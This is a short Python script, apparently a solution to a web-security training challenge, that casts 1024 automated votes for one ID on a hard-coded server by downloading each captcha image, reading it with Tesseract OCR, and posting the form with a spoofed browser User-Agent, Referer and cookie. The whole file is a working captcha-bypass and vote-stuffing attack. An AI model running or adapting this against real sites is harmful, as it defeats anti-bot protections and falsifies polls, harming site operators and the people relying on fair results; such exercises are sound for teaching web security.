#!/usr/bin/python3
import requests
import pytesseract
try:
    import Image
except ImportError:
    from PIL import Image


def vote_4_pedro():
    URL = 'http://158.69.76.135/level3.php'
    payload = {
        'id': 332,
        'holdthedoor':'Submit',
        'key':'0'
    }
    header = {
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
        'Referer':URL
    }
    cookie = {
        'HoldTheDoor': '0',
        'Expires':'0',
        'Max-Age':'0'
    }

    votes = 0
    while votes < 1024:
        """finding the image every post"""
        r = requests.get('http://158.69.76.135/captcha.php', cookies=cookie, headers=header)
        with open('captcha' , mode='wb') as f:
            f.write(r.content)
        im = Image.open('captcha')
        """using tesseract to convert the image to string"""
        text = pytesseract.image_to_string(im, lang='eng')
        payload['captcha'] = text
        r = requests.post(URL, data=payload, headers=header, cookies=cookie)
        print("Voted: {} times".format(votes)) 
        votes += 1

vote_4_pedro()
